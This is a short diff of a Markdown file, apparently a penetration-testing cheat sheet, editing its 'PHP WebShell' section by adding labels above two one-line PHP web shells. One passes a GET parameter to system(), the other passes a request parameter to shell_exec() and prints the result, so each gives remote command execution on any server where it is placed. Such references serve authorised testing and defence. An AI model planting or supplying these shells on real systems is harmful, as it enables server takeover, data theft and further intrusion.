@@ -116,11 +116,13 @@
   ```
   
   ### PHP WebShell
-
+  
+  `Basic`
   ```php
   <?php system($_GET['cmd']); ?>
   ```
   
+  `Proportions OK`
   ```php
   <?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>
   ```
